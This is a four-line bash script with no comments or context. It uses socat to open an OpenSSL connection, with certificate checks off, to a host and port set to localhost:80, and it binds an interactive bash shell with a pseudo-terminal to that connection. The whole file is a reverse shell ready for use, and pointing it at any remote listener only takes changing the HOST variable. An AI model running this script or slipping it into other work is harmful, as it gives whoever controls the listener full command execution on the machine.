#! /bin/bash

HOST=localhost
PORT=80
socat openssl-connect:$HOST:$PORT,verify=0 exec:bash,pty,stderr,setsid
